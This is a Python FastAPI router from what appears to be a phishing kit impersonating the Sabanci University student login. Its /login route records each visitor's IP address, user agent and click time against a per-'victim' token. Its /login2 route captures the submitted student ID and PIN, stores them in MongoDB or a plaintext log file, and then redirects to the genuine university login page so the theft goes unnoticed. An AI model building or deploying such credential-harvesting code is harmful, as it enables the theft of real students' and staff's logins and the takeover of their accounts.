from fastapi import APIRouter, Request, Query, Form, HTTPException, status
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from db.database import MongoDB
from datetime import datetime
import logging
from pathlib import Path

router = APIRouter()
templates = Jinja2Templates(directory="templates")  # Ensure 'templates' directory exists
mongo_db = MongoDB()

# Define paths using pathlib for better handling
logs_dir = Path(__file__).resolve().parent.parent / 'logs'
log_clicked_file = logs_dir / 'log_clicked.txt'
submitted_logs_file = logs_dir / 'submitted_logs.txt'

# Ensure the logs directory exists
logs_dir.mkdir(parents=True, exist_ok=True)

@router.get("/login", response_class=HTMLResponse)
async def login(request: Request, token: str = Query(None)):
    ip_address = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown")
    click_date = datetime.now()

    if token:
        # Check if token exists in MongoDB
        victim = mongo_db.get_victim_by_token(token)
        if victim:
            # Update victim's click info
            if mongo_db.update_victim_click_info(
                token, ip_address, user_agent, click_date
            ):
                logging.info(f"Updated click info for victim with token {token}")
                return templates.TemplateResponse(
                    "index.html",
                    {"request": request, "status": "Success", "token": token},
                )
        else:
            logging.error(f"Victim with token {token} not found")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Internal Server Error",
            )
    else:
        # Log click info to log_clicked.txt
        log_message = f"IP Address: {ip_address} - User Agent: {user_agent} - Timestamp: {click_date}\n"
        with open(log_clicked_file, "a") as f:
            f.write(log_message)
        return templates.TemplateResponse(
            "index.html", {"request": request, "status": "Logged Click Info"}
        )

@router.post("/login2")
async def login2(
    request: Request,
    sid: str = Form(...),
    PIN: str = Form(...),
    token: str = Form(None),
):
    ip_address = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown")
    submit_date = datetime.now()
    submitted_username_password = f"{sid}:{PIN}"

    if token:
        # Check if token exists in MongoDB
        victim = mongo_db.get_victim_by_token(token)
        if victim:
            # Update victim's submit info
            if mongo_db.update_victim_submit_info(
                token, ip_address, user_agent, submit_date, submitted_username_password
            ):
                logging.info(f"Updated submit info for victim with token {token}")
                return RedirectResponse(
                    url="https://suis.sabanciuniv.edu/prod/twbkwbis.P_SabanciLogin",
                    status_code=status.HTTP_303_SEE_OTHER,
                )
        else:
            logging.error(f"Victim with token {token} not found")
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Victim not found",
            )
    else:
        # Log submit info to submitted_logs.txt
        log_message = f"IP Address: {ip_address} - Username-Password: {submitted_username_password} - User Agent: {user_agent} - Timestamp: {submit_date}\n"
        with open(submitted_logs_file, "a") as f:
            f.write(log_message)
        return RedirectResponse(
            url="https://suis.sabanciuniv.edu/prod/twbkwbis.P_SabanciLogin",
            status_code=status.HTTP_303_SEE_OTHER,
        )
